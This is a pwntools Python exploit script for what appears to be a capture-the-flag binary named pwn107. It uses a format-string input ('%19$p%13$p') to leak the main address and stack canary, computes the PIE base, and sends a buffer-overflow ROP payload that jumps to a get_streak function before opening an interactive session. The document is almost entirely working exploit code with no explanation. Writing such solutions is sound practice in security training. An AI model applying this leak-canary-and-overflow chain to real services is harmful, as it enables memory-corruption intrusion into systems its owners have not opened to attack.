from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './pwn107.pwn107'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()

io.sendlineafter(b'? ','%19$p%13$p')
io.recvline()
io.recvuntil(b': ')
main_addr = int(io.recv(14).decode(),16)
canary = int(io.recv(18).decode(),16)
log.info("LEAKED MAIN: " + hex(main_addr))
log.info("CANARY: " + hex(canary))

elf.address = main_addr - elf.symbols.main
log.info("PIE: " + hex(elf.address))

offset = 24
padding = b'B'*offset
get_streak = elf.symbols.get_streak
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
payload = padding + p64(canary) + b"B"*8 + p64(ret) + p64(get_streak)

print(io.recv())
write('payload', payload)
# Send the payload
io.sendline(payload)
# Receive the flag
io.interactive()